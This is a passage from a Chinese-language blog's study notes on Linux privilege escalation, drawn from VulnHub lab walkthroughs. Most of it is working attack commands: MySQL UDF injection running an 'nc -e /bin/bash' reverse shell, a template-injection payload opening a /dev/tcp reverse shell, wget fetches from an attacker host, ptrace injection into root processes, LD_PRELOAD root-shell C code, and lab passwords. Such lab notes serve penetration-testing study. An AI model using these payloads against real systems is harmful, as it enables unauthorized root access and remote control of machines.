pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>cd tmp</p><p>wget <a href="http://192.168.139.141:8080/udf.so">http://192.168.139.141:8080/udf.so</a></p><p>-连接进行导出调用</p><p>mysql -uroot -pR@v3nSecurity   &#x2F;&#x2F;翻配置文件翻出来的</p><p>select version(); #查看mysql版本</p><p>select @@basedir; #确认mysql安装位置</p><p>show variables like ‘%basedir%’; #确认mysql安装位置</p><p>show variables like ‘%secure%’; #查看可导出文件位置。 &#x2F;&#x2F;看一下secure_file_priv是否关闭，如果开启写入文件后受限制，需要关闭状态</p><p>show variables like ‘%plugin%’; #查找插件位置 &#x2F;&#x2F;一会把udf.so提权文件放到这边</p><p>show variables like ‘%compile%’; #查看系统版本</p><p>use mysql;</p><h1 id="创建xiaodi表"><a href="#创建xiaodi表" class="headerlink" title="创建xiaodi表"></a>创建xiaodi表</h1><p>create table xiaodi(line blob);</p><h1 id="往xiaodi表中插入二进制的udf-so"><a href="#往xiaodi表中插入二进制的udf-so" class="headerlink" title="往xiaodi表中插入二进制的udf.so"></a>往xiaodi表中插入二进制的udf.so</h1><p>insert into xiaodi values(load_file(‘&#x2F;tmp&#x2F;udf.so’));</p><h1 id="导出udf-so"><a href="#导出udf-so" class="headerlink" title="导出udf.so"></a>导出udf.so</h1><p>select * from xiaodi into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so’;&#x2F;&#x2F;这里不直接下载到plugin目录下是因为web wget通常只能下载到tmp目录下，其他目录大概率没权限 ，在此之前记得chmod加执行权限</p><h1 id="创建do-system自定义函数"><a href="#创建do-system自定义函数" class="headerlink" title="创建do_system自定义函数"></a>创建do_system自定义函数</h1><p>create function do_system returns integer soname ‘udf.so’;</p><p>select do_system(‘nc 192.168.139.141 6666 -e &#x2F;bin&#x2F;bash’);</p><h3 id="Web-用户-Capability能力-理解为SUID升级版"><a href="#Web-用户-Capability能力-理解为SUID升级版" class="headerlink" title="Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版"></a>Web&amp;用户-Capability能力 &#x2F;&#x2F;理解为SUID升级版</h3><p>原理参考：<a href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></p><p>cp &#x2F;usr&#x2F;bin&#x2F;php &#x2F;tmp&#x2F;php</p><p>设置能力：setcap cap_setuid+ep &#x2F;tmp&#x2F;php&#x2F;&#x2F;让&#x2F;tmp&#x2F;php有suid权限</p><p>删除能力：setcap -r &#x2F;tmp&#x2F;php</p><p>查看单个能力：getcap &#x2F;usr&#x2F;bin&#x2F;php</p><p>查看所有能力：getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724900446933-af6cfad0-a91a-4118-a2d7-390fc012bda9.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901611974-a20e2fea-6dac-46f3-8a0e-4654bd69e5a2.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724901632225-67d2ff77-6a66-48aa-b8e2-50d5f9235252.png"></p><p>.&#x2F;tmp&#x2F;php -r “posix_setuid(0); system(‘&#x2F;bin&#x2F;sh’);”</p><p>Hacker_Kid</p><p>WP参考：<a href="https://www.jianshu.com/p/60673ac0454f">https://www.jianshu.com/p/60673ac0454f</a>里面包含查看能力的解释</p><p>环境：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><p>web入口点：账号密码</p><p>saket</p><p>Saket!#$%@!!</p>{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.139.141/6688 0>&1"')}}<p><a href="http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos.system(%27bash+-c+%22bash+-i+&%3E+/dev/tcp/192.168.139.141/6688+0%3E&1%22%27)%7D%7D">http://192.168.139.156:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F192%2E168%2E139%2E141%2F6688+0%3E%261%22%27%29%7D%7D</a></p><p>python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程</p><p>&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p><p>python -m http.server 8080</p><p>wget <a href="http://192.168.139.141:8080/inject.py">http://192.168.139.141:8080/inject.py</a></p><p>for i in <code>ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;</code>; do python2.7 inject.py $i; done&#x2F;&#x2F;注入所有root权限进程</p><p>nc 192.168.139.156 5600</p><p>结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用</p><h3 id="普通用户-LD-Preload加载"><a href="#普通用户-LD-Preload加载" class="headerlink" title="普通用户-LD_Preload加载"></a>普通用户-LD_Preload加载</h3><p>&#x2F;&#x2F;只不过linux中特有的，是程序运行前就把要加载的程序包括了，这个LD_Preload是让程序需要的时候再加载，和dll提权差不多，当sudo提权查找到的是第三方文件的时候适用</p><p>参考：<a href="https://www.cnblogs.com/backlion/p/10503985.html">https://www.cnblogs.com/backlion/p/10503985.html</a></p><p>修改&#x2F;etc&#x2F;sudoers</p><p>Defaults env_keep +&#x3D; LD_PRELOAD&#x2F;&#x2F;允许程序启用</p><p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find&#x2F;&#x2F;给test用户在运行find命令时所有的运行权限，不需要输入密码确定</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line">void <span class="emphasis">_init() &#123;</span></span><br><span class="line"><span class="emphasis">unsetenv(&quot;LD_</span>PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles&#x2F;&#x2F;自己写一个加载文件</p><p>ls -al shell.so</p><p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so find&#x2F;&#x2F;在sudo运行find是加载写入的加载文件</p><p>whoami</p><p>Defaults env_keep +&#x3D; LD_PRELOAD</p><p>test ALL&#x3D;(ALL:ALL) NOPASSWD: &#x2F;tmp&#x2F;LinEnum.sh</p><p>sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;shell.so &#x2F;tmp&#x2F;LinEnum.sh</p><p>结论：sudo提权有限制，如果sudo里面第三方文件就得二进制分析，难度较大，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权</p><h2 id="普通用户-Rbash绕过"><a href="#普通用户-Rbash绕过" class="headerlink" title="普通用户-Rbash绕过"></a>普通用户-Rbash绕过</h2><p>会给rbash用户组下面非常低的权限，rbash是linux限制用户权限的技术</p><p>参考：<a href="https://xz.aliyun.com/t/7642">https://xz.aliyun.com/t/7642</a></p><p>Rbash(The Restricted mode of bash),也就是限制型bash</p><p>在渗透测试中可能遇到rbash，尝试绕过后才能进行后续操作</p><p>sudoadduser xiaodisec</p><p>sudo usermod -s &#x2F;bin&#x2F;rbash xiaodisec</p><p><a href="https://www.vulnhub.com/entry/funbox-rookie,520/">https://www.vulnhub.com/entry/funbox-rookie,520/</a></p><p>1、入口点：</p><p>fscan -h 192.168.1.0&#x2F;24</p><p>ftp 192.168.1.8</p><p>get tom.zip(iubire)</p><p>ssh <a href="mailto:&#116;&#111;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#56;">&#116;&#111;&#x6d;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#x2e;&#56;</a> -i id_rsa</p><p>2、Rbash绕过：</p><p>python -m http.server 8080</p><p>wget <a href="http://192.168.1.3:8080/LinEnum.sh">http://192.168.1.3:8080/LinEnum.sh</a></p><p>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’&#x2F;&#x2F;sudo</p><p>3、历史泄漏提权：</p><p>.&#x2F;LinEnum.sh</p><p>cat &#x2F;home&#x2F;tom&#x2F;.mysql_history</p><p>su root(xx11yy22!)</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> linux </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
